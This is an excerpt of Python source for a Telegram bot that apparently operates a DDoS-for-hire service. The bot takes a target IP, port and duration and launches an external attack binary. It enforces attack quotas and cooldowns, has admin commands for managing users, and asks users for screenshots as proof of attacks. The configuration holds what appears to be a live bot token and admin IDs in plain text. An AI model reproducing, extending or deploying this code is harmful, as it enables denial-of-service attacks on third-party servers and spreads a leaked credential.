...
# ===== CONFIGURATION =====
BOT_TOKEN = "7204500969:AAFfrGbr56RARjA3mcwndPFtsKwGqXRN8ZU"
ADMIN_IDS = [7383077317, 1066744659]
SUPPORT_USERNAME = "@X9HYDRA @INSANOIC"
DEVELOPER = "@X9HYDRA @INSANOIC"
INVITE_BONUS_CONTACT = "@X9HYDRA"
BLOCKED_PORTS = [8700, 20000, 443, 17500, 9031, 20002, 20001]
MAX_ATTACK_DURATION = 240
MAX_CONCURRENT_ATTACKS = 10
DAILY_ATTACK_LIMIT = 40
...
FEEDBACK_FILE = 'feedback.json'  # New file for feedback
ATTACK_IMAGES = [
...
active_attacks = {}
pending_attacks = {}
feedback_pending = {}  # New dictionary to track users pending feedback
file_lock = Lock()
attack_processes = {}
logging.basicConfig(
    level=logging.INFO,
...
feedbacks = load_data(FEEDBACK_FILE, default=[])  # Load feedback data
# ===== UTILITY FUNCTIONS =====
def get_uptime():
...
async def run_attack_async(target_ip, target_port, duration, user_id, chat_id, binary):
    ...
    try:
        ...
        try:
            random_image = random.choice(ATTACK_IMAGES)
            bot.send_photo(chat_id, random_image, caption=start_msg, parse_mode='HTML')
        except Exception as e:
        ...
        try:
            random_image = random.choice(ATTACK_IMAGES)
            bot.send_photo(chat_id, random_image, caption=end_msg, parse_mode='HTML')
        except Exception as e:
        ...
        # Prompt for feedback
        feedback_msg = (
            f"📸 <b>Please share a screenshot of the attack results.</b>\n"
            f"🔹 This helps us verify and improve the service.\n"
            f"🔹 Reply with a photo, or proceed with another attack.\n"
            f"📞 Contact {SUPPORT_USERNAME} for support."
        )
        bot.send_message(chat_id, feedback_msg, parse_mode='HTML')
        feedback_pending[user_id] = {'attack_id': attack_id, 'chat_id': chat_id}
        bot.register_next_step_handler_by_chat_id(chat_id, process_feedback)
    except Exception as e:
...
def process_feedback(message):
    ...
    if user_id not in feedback_pending:
        bot.send_message(chat_id, "❌ No feedback pending. Start a new attack with /attack.")
        return
    feedback_data = feedback_pending.pop(user_id)
    attack_id = feedback_data['attack_id']
    if message.photo:
        ...
        bot.send_message(chat_id, "✅ Feedback received! Thank you for your submission.")
        logger.info(f"Feedback received from user {user_id} for attack {attack_id}")
    else:
        bot.send_message(chat_id, "⚠️ Please send a photo as feedback. Try again or proceed with another attack.")
        feedback_pending[user_id] = feedback_data
        bot.register_next_step_handler_by_chat_id(chat_id, process_feedback)
...
def send_welcome(message):
    ...
    try:
        bot.send_photo(chat_id, PLAN_IMAGE, caption=welcome_msg, reply_markup=markup, parse_mode='Markdown')
    except Exception as e:
...
def rules_command(message):
    ...
    rules = (
        ...
        f"4. 📸 Submit a screenshot after each attack to help verify results.\n"
        f"5. 🛡️ Respect the bot and its users. Misuse may lead to a ban.\n"
        f"6. 📞 Contact {SUPPORT_USERNAME} for support or to report issues.\n\n"
...
def view_feedback_command(message):
    ...
    feedback_list = "\n".join([
        f"{i+1}. User: {fb['user_id']} | Attack: {fb['attack_id']} | Time: {format_time(fb['timestamp'])}"
        for i, fb in enumerate(recent_feedbacks)
    ])
    markup = InlineKeyboardMarkup()
    for i, fb in enumerate(recent_feedbacks):
        markup.add(InlineKeyboardButton(f"View Feedback {i+1}", callback_data=f"viewfb_{fb['attack_id']}"))
    bot.send_message(
        chat_id,
        f"📸 <b>Recent Feedback</b> (Total: {len(feedbacks)})\n\n{feedback_list or 'No feedback submitted'}",
        reply_markup=markup,
        parse_mode='HTML'
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith('viewfb_'))
def view_feedback_callback(call):
    try:
        attack_id = call.data.split('_')[1]
        feedback = next((fb for fb in feedbacks if fb['attack_id'] == attack_id), None)
        if not feedback:
            bot.send_message(call.message.chat.id, "❌ Feedback not found.")
            return
        bot.send_photo(
            call.message.chat.id,
            feedback['file_id'],
            caption=(
                f"📸 <b>Feedback Details</b>\n\n"
                f"👤 User ID: {feedback['user_id']}\n"
                f"🔗 Attack ID: {feedback['attack_id']}\n"
                f"⏳ Submitted: {format_time(feedback['timestamp'])}"
            ),
            parse_mode='HTML'
        )
...
def remove_user_command(message):
    ...
    try:
        ...
        global attack_logs, invites, banned_users, feedbacks
        ...
        feedbacks = [fb for fb in feedbacks if fb.get('user_id') != target_user_id]
        save_data(USERS_FILE, users)
        save_data(ATTACK_LOG_FILE, attack_logs)
        save_data(INVITES_FILE, invites)
        save_data(BAN_LIST_FILE, banned_users)
...
def my_account(message):
    ...
    try:
        bot.send_photo(chat_id, PLAN_IMAGE, caption=account_msg, parse_mode='HTML')
    except Exception as e:
        logger.error(f"Error sending plan image: {e}")
...
if __name__ == '__main__':
    ...
    for filename in [USERS_FILE, ATTACK_LOG_FILE, BAN_LIST_FILE, SYSTEM_STATS_FILE, GROUPS_FILE, COOLDOWN_FILE, INVITES_FILE, FEEDBACK_FILE]:
